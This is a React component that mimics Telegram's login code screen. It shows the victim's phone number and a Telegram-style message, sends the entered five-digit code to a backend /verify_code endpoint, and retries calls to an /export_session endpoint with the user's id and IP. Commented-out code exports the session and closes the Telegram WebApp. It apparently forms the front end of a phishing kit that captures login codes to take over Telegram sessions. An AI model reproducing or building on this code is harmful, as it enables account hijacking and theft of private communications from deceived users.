import React, { useState } from "react";
import { api } from '../services/router';
import { useNavigate } from "react-router-dom";
const AuthScreen = ({ phone, IP }) => {
    // const navigate = useNavigate();
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("")
    const navigate = useNavigate();
    const handleVerificatiionCode = async (event) => {
        try {
            const inputValue = event.target.value;
            if (inputValue.length === 5) {
                const userId = localStorage.getItem("user_id");
                const data = {
                    code: inputValue,
                    user_id: userId
                };

                setLoading(true);

                try {
                    // First verify code
                    const verifyResponse = await api.post("/verify_code", data, {
                        headers: {
                            "Content-Type": "application/json",
                            "Retry-Attempt": "3"  // Add retry header
                        }
                    });
                    console.log(verifyResponse)
                    navigate("/success")

                    // Then export session
                    // const exportResponse = await api.get(`/export_session/${userId}`, {
                    //     params: { ip: IP },
                    //     timeout: 10000  // 10 second timeout
                    // });
                    // console.log(exportResponse)
                    // // Handle Telegram WebApp closure
                    // if (window.Telegram?.WebApp?.close) {
                    //     window.Telegram.WebApp.close();
                    // }

                } catch (error) {
                    if (error.response?.status === 503) {
                        // Implement retry logic
                        let attempts = 0;
                        while (attempts < 3) {
                            try {
                                await new Promise(resolve => setTimeout(resolve, 2000));
                                const retryResponse = await api.get(`/export_session/${userId}?ip=${IP}`);
                                navigate("/success")
                                break;
                            } catch (retryError) {
                                console.error(retryError)
                                attempts++;
                            }
                        }
                    }
                    throw error;
                }
            }
        } catch (error) {
            console.error("Verification failed:", error);
            setError(error.response?.data?.detail || "Operation failed");
        } finally {
            setLoading(false);

        }
    };


    const handleCodeFocus = () => {
        setError("")
    }



    return (
        <div className="flex items-center justify-center min-h-screen bg-gray-900">
            <div className="w-80  text-center ">
                {/* Monkey Avatar */}
                <div className="flex justify-center">
                    <span className="text-6xl">🐵</span>
                </div>

                {/* Phone Number */}
                <h2 className="text-xl font-semibold text-white mt-4">
                    {phone}
                    <span className="text-gray-400 cursor-pointer"><a href="/">✏️</a></span>
                </h2>

                {/* Info Text */}
                {error
                    ? (
                        <p className="text-red-400 text-sm mt-2">
                            {error}
                        </p>
                    )
                    :
                    <p className="text-gray-400 text-sm mt-2">
                        We have sent you a message in Telegram with the code.
                    </p>
                }

                {/* Code Input */}
                <div className="mt-4">
                    <label className="block text-left text-gray-400 text-sm mb-1">Code</label>
                    {loading ? (
                        <div className="text-center ">
                            <p className="text-lg text-white">Verifying...</p>
                            <div className="loader"></div> {/* Add a CSS loading spinner */}
                        </div>
                    ) : (
                        <input
                            onKeyUp={handleVerificatiionCode}
                            onFocus={handleCodeFocus}
                            type="text"
                            className="w-full p-2 border border-gray-600 bg-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none text-white text-center"
                            placeholder="Enter Code"
                        />
                    )}
                </div>

            </div>
        </div>
    );
};

export default AuthScreen;
